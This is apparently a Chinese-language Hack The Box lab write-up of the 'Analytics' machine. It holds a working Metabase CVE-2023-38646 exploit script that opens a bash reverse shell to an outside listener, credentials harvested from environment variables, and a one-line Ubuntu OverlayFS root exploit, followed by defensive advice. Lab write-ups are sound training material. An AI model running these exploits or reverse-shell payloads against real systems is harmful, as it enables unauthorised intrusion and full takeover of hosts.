---
title: "HTB: Analytics"
difficulty: Easy
date: 2024-12-15
tags: [HTB, Linux, CVE-2023-38646, Metabase, Docker]
featured: true
excerpt: "一台運行 Metabase 的 Easy 難度機器，透過 CVE-2023-38646 預認證 RCE 漏洞取得初始立足點，並利用 Ubuntu Overlay FS 權限提升漏洞提權至 root。"
---

## 機器資訊

- 平台: Hack The Box
- 難度: Easy
- IP: 10.10.11.233
- 作業系統: Linux

## 偵察階段

首先進行 Nmap 掃描：

```bash
nmap -sC -sV -oN nmap/initial 10.10.11.233
```

掃描結果：
- **22/tcp** - SSH (OpenSSH 8.2p1)
- **80/tcp** - HTTP (nginx 1.18.0)

訪問 80 端口發現一個數據分析平台，使用 Metabase 0.46.6 版本。

## 漏洞分析

### CVE-2023-38646 - Metabase Pre-Auth RCE

Metabase 版本 0.46.6 存在一個嚴重的預認證遠程代碼執行漏洞：

1. 攻擊者可以通過 `/api/setup/validate` 端點
2. 利用 setup token 繞過認證
3. 執行任意 H2 SQL 查詢
4. 通過 JDBC 連接字符串實現 RCE

### 取得 Setup Token

```bash
curl -s http://10.10.11.233/api/session/properties | jq -r '.["setup-token"]'
```

得到 token: `249fa03d-fd94-4d5b-b94f-b4ebf3df681f`

## Initial Access

使用公開的 POC 腳本進行攻擊：

```python
import requests
import base64

target = "http://10.10.11.233"
setup_token = "249fa03d-fd94-4d5b-b94f-b4ebf3df681f"

# Reverse shell payload
payload = f"bash -c 'bash -i >& /dev/tcp/10.10.14.15/4444 0>&1'"
encoded = base64.b64encode(payload.encode()).decode()

# Exploit
exploit = {
    "token": setup_token,
    "details": {
        "is_on_demand": False,
        "is_full_sync": False,
        "is_sample": False,
        "cache_ttl": None,
        "refingerprint": False,
        "auto_run_queries": True,
        "schedules": {},
        "details": {
            "db": f"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;INIT=CREATE ALIAS SHELLEXEC AS $$ void shellexec(String cmd) throws java.io.IOException {{ Runtime.getRuntime().exec(new String[]{{\"bash\",\"-c\",cmd}}); }}$$\\;CALL SHELLEXEC('echo {encoded} | base64 -d | bash')",
            "advanced-options": False,
            "ssl": True
        },
        "name": "x",
        "engine": "h2"
    }
}

requests.post(f"{target}/api/setup/validate", json=exploit)
```

開啟監聽並執行腳本：

```bash
nc -lvnp 4444
python3 exploit.py
```

成功取得 shell，身份為 `metabase` 用戶在 Docker 容器內。

## 橫向移動

### 環境變數發現憑證

檢查環境變數：

```bash
env | grep -i pass
```

發現：
```
META_USER=metalytics
META_PASS=An4lytics_ds20223#
```

嘗試 SSH 登入主機：

```bash
ssh metalytics@10.10.11.233
# 使用密碼: An4lytics_ds20223#
```

成功登入！取得 user flag：

```bash
cat /home/metalytics/user.txt
```

## 權限提升

### 系統資訊收集

```bash
uname -a
# Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu
```

這是 Ubuntu 22.04，kernel 版本 6.2.0-25 存在已知的權限提升漏洞。

### CVE-2023-2640 & CVE-2023-32629 - Ubuntu OverlayFS

這兩個漏洞允許本地用戶通過濫用 OverlayFS 的 copy_up 功能實現權限提升。

使用 GameOver(lay) 一行命令提權：

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("bash")'
```

命令解析：
1. 創建 overlay 文件系統結構
2. 複製 python3 到 lower 目錄
3. 設置 CAP_SETUID capability
4. 掛載 overlay
5. 觸發 copy_up 操作
6. 利用 python 提權到 root

執行後成功獲得 root shell：

```bash
id
# uid=0(root) gid=1000(metalytics) groups=1000(metalytics)

cat /root/root.txt
```

## Flags

```
user.txt: 7********************************3
root.txt: b********************************8
```

## 總結

這台機器展示了兩個重要的安全概念：

1. **CVE-2023-38646 (Metabase RCE)**: 應用程序預認證漏洞的危害性，強調了及時更新軟件的重要性
2. **Kernel 權限提升**: Ubuntu OverlayFS 漏洞提醒我們保持系統核心更新的必要性

### 防禦建議

- 升級 Metabase 至最新版本 (>0.46.6.1)
- 更新 Linux kernel 修補 OverlayFS 漏洞
- 避免在環境變數中存儲明文密碼
- 實施最小權限原則
- 定期進行安全審計

## 參考資料

- [CVE-2023-38646 - Metabase RCE](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)
- [Ubuntu OverlayFS Exploit](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)
- [Metabase Security Advisory](https://www.metabase.com/blog/security-advisory)
